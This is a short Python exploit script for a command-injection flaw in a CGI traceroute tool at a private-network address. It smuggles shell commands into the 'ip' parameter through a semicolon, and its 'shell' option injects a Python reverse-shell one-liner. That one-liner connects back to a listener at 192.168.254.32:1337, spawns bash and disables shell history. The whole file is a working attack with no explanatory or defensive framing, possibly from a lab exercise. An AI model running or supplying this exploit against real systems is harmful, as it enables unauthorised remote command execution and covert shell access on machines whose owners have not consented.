# Simple exploit for remote command execution
import requests
import urllib.parse
import sys
import os

url = 'http://192.168.254.68/cgi-bin/tracertool.cgi?ip='
cmd = ''

# Reverse shell oneliner
shell = '''python -c "import os;import pty;import socket;lhost = '192.168.254.32';lport = 1337;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((lhost, lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');s.close()"'''

for arg in sys.argv[1:]:
	if arg == "shell":
		cmd = shell
		break
	cmd = cmd + " " + arg

# Make the request
cmd      = ';'+cmd
request  = (url + urllib.parse.quote_plus(cmd))
response = requests.get(request)

# now we filter it and then print
top      = response.text.find('<pre>')
bottom   = response.text.find('</pre>')
print(response.text[top+6:bottom-1])
